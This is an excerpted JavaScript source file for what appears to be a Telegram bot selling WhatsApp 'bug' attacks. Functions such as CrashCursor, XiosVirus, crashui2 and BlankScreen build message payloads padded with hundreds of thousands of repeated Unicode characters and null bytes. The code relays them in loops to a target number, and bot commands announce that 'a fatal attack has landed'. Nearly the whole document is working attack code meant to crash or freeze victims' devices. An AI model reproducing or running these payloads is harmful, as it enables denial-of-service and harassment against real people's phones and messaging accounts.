...
async function delayforceMessage(targetJid) {
          ...
          interactiveMessage: {
              ...
              quotedMessage: {
                    documentMessage: {
                        ...
                        fileName: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   ",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   "
                    },
                },
              },
            body: {
              text: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   " + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
    ...
    await ctx.relayMessage(targetJid, message, {
...
async function CrashCursor(targetJid) {
  ...
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   " + "ꦾ".repeat(25000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            ...
            quotedMessage: {
              buttonsMessage: {
                ...
                contentText: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   ",
                footerText: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   ",
                    },
                    type: 1,
                  },
                ],
            ...
            isSampled: true,
            externalAdReply: {
              title: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   ",
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   ",
              thumbnail: "",
              sourceUrl: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   ",
              sourceId: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   ",
              ctwaClid: "cta",
              ref: "ref",
            ...
            forwardedNewsletterMessageInfo: {
              ...
              serverMessageId: 1,
              newsletterName: ` 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰     - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
          ...
          description: " 🦠⃟͒  ⃨⃨⃨𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹 ヶ⃔͒⃰   ",
        },
        messageContextInfo: {
  ...
  await ctx.relayMessage(targetJid, messagePayload, {
    participant: { jid: targetJid},
  });
}

async function newLoaudFast1(targetJid) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
...
async function newLoadFast(targetJid) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
...
async function IosMJ(targetJid, Ptcp = false) {
...
async function XiosVirus(targetJid) {
      ctx.relayMessage(
        targetJid,
        {
          extendedTextMessage: {
            text: `Wanna With Yours ZyzNzoo :D -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: targetJid,
              participant: targetJid,
              quotedMessage: {
                conversation: "Gpp Ya:D ‌" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
...
async function crashui2(targetJid, ptcp = false) {
    await ctx.relayMessage(targetJid, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "We Aryouu ZyzNzoo. :D" + "ꦾ".repeat(300000)  + "@1".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
...
async function sendOfferCall(targetJid) {
    try {
        await ctx.offerCall(targetJid);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}
async function BlankScreen(targetJid, Ptcp = false) {
let virtex =  "🦠 𝑿𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑨𝑻𝑻𝑨𝑪𝑲𝑬𝑹" + "ꦽ".repeat(45000) + "@0857705848013".repeat(50000);
			await ctx.relayMessage(targetJid, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								...
								contextInfo: {
								mentionedJid: ["0857705848013@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
            ...
            console.log(chalk.red.bold('🌸͜͞ZnzNzoo🌿'))
   	};
...
async function invc2(nomor) {
     ...
     let msg = await generateWAMessageFromContent(targetJid, {
            ...
            await ctx.relayMessage(targetJid, msg.message, {
                messageId: msg.key.id,
                participant: { jid: targetJid }
            });
        }
        
    async function BugIos(targetJid) {
      for (let i = 0; i < 15; i++) {
        await crashui2(targetJid, ptcp = false);
        await delayforceMessage(targetJid);
        await invisPayload(targetJid);
        await IosMJ(targetJid, Ptcp = false);
        await newLoadFast(targetJid);
        await newLoaudFast1(targetJid);
        await CrashCursor(targetJid)
        await CrashCursor(targetJid);
        await invc2(targetJid);
        await XiosVirus(targetJid);
        await BlankScreen(targetJid, Ptcp = false);
      }
      console.log(
        chalk.red(
          `Send Bug By Zyznzo :)!`
...
bot.command("stronges", checkWhatsAppConnection, async (ctx) => {
    ...
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        Prosesctx.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by ctx`
    );
});

bot.command("quertytrash", checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
...
bot.command("xsbeta", checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
...
bot.command("invisitrash", checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
...
bot.command("delaymassage", checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
